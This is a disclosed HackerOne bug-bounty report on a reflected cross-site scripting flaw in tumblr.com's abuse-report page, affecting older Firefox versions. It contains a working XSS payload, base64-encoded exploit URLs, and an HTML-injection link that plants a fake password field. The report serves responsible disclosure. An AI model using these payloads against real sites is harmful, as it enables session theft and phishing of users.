---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '915756'
original_report_id: '915756'
title: '[tumblr.com] 69< Firefox Only  XSS Reflected'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: automattic
created_at: '2020-07-05T08:45:37.031Z'
disclosed_at: '2020-07-09T17:11:04.710Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: www.tumblr.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [tumblr.com] 69< Firefox Only  XSS Reflected

## Metadata

- HackerOne Report ID: 915756
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: automattic
- Disclosed At: 2020-07-09T17:11:04.710Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description :

Hello, i have found a XSS Reflected in https://www.tumblr.com/abuse/start?prefill=<base64>
But the XSS only works in versions of firefox that are below 70.
Because its been blocked by CSP, but the version below 69 of firefox is vulnerable.
Here's a great article about this subject https://portswigger.net/daily-swig/firefox-vulnerable-to-trivial-csp-bypass
But CSP dont block HTML tag in the lastest version of all navigators

Vulnerable Url  :

https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=

Payload :

<object data=\"javascript:alert(document.cookie)\">

Vulnerable Parameter :

/\ Note you must decode the $_GET['prefill'], this is encoding is  in base64 /\
After decoded it, you can see this 

{"post":null,"urlreporting":"https://fuzzme.tumblr.com/","tumblelog":"<object data=\"javascript:alert(document.cookie)\">","context":"blog"}

The array value of tumblelog  is reflected into the HTML this him who as vulnerable
The array value of tumblelog  is the  vulnerable array value

 Steps To Reproduce for XSS Only Firefox :

1. Download firefox 69 at https://ftp.mozilla.org/pub/firefox/releases/69.0/
2. Go to login in your Tumblr account
3. Click to this link, and you will see XSS pop-up

LINK : https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxvYmplY3QgZGF0YT1cImphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKVwiPiIsImNvbnRleHQiOiJibG9nIn0=

Steps To Reproduce for HTML injection :

1. Go to login in your Tumblr account
2. Click to this link  https://www.tumblr.com/abuse/start?prefill=eyJwb3N0IjpudWxsLCJ1cmxyZXBvcnRpbmciOiJodHRwczovL2Z1enptZS50dW1ibHIuY29tLyIsInR1bWJsZWxvZyI6IjxpbnB1dCB0eXBlPSd0ZXh0JyBwbGFjZWhvbGRlcj0nRW50ZXIgeW91IHBhc3N3b3JkJz4iLCJjb250ZXh0IjoiYmxvZyJ9
3. And you will see a HTML input  with `enter your password`


POC:

The attachment video

## Impact

The vulnerability allow a malicious user to inject html tags and execute Javascript which could lead to steal user's session, and performing phishing.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
